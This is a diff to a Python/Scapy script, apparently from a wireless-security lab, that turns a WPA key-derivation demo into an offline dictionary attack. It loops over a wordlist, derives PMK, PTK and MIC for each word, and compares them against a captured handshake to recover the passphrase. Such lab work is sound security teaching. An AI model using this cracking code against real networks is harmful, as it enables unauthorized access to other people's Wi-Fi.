@@ -39,7 +39,7 @@ def customPRF512(key,A,B):
 wpa=rdpcap("wpa_handshake.cap") 
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
+
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 
 # Can be seen with a wpa.show() in which frame they are
@@ -59,32 +59,25 @@ B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(A
 
 data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
 
-print "\n\nValues used to derivate keys"
-print "============================"
-print "Passphrase: ",passPhrase,"\n"
-print "SSID: ",ssid,"\n"
-print "AP Mac: ",b2a_hex(APmac),"\n"
-print "CLient Mac: ",b2a_hex(Clientmac),"\n"
-print "AP Nonce: ",b2a_hex(ANonce),"\n"
-print "Client Nonce: ",b2a_hex(SNonce),"\n"
+dico = open("dico.txt") #wordlist file
+for word in dico:
+	word = word[:-1]  #remove the \n
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
+	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+	pmk = pbkdf2_hex(word, ssid, 4096, 32)
 
-#expand pmk to obtain PTK
-ptk = customPRF512(a2b_hex(pmk),A,B)
+	#expand pmk to obtain PTK
+	ptk = customPRF512(a2b_hex(pmk),A,B)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+	mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+
+	if(mic.hexdigest()[:-8] == mic_to_test):
+		
+		print "============================"
+		print "Passphrase: ",word,"\n"
+		print "MIC:\t\t",mic.hexdigest(),"\n"
+		#print wpa.show()
+		break;
 
 
-print "\nResults of the key expansion"
-print "============================="
-print "PMK:\t\t",pmk,"\n"
-print "PTK:\t\t",b2a_hex(ptk),"\n"
-print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
-print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
-print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
-print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
-print "MIC:\t\t",mic.hexdigest(),"\n"
-#print wpa.show()
